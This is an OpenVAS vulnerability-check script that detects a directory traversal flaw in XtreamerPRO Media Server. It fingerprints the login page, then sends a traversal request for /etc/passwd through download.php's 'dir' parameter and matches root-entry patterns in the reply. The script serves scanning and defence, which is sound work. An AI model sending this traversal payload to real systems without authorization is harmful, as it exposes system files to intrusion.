###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_xtreamerpro_media_server_dir_trav_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# XtreamerPRO Media Server 'dir' Parameter Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to perform directory
traversal attacks and read arbitrary files on the affected application.

Impact Level: Application";

tag_affected = "XtreamerPRO Version 2.6.0, 2.7.0, Other versions may also be
affected.";

tag_insight = "The flaws are due to input validation error in 'dir' parameter
to 'download.php' and 'otherlist.php', which allows attackers to read arbitrary
files via a /%2f.. sequences.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running XtreamerPRO Media Server and is prone to
multiple directory traversal vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900286");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("XtreamerPRO Media Server 'dir' Parameter Multiple Directory Traversal Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17290/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101476");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Send and Receive the response
req = http_get(item:"/login_form.php", port:port);
res = http_send_recv(port:port, data:req);

if(res =~ ">Copyright .*[0-9]{4} Xtreamer.net")
{
  ## Construct Directory Traversal Attack Path
  path = "/download.php?dir=/%2f../%2f../etc/&file=passwd";

  ## Construct Directory Traversal Attack Request
  req = http_get(item:path, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Check for patterns present in /etc/passwd file in the response
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:res)){
    security_message(port);
  }
}
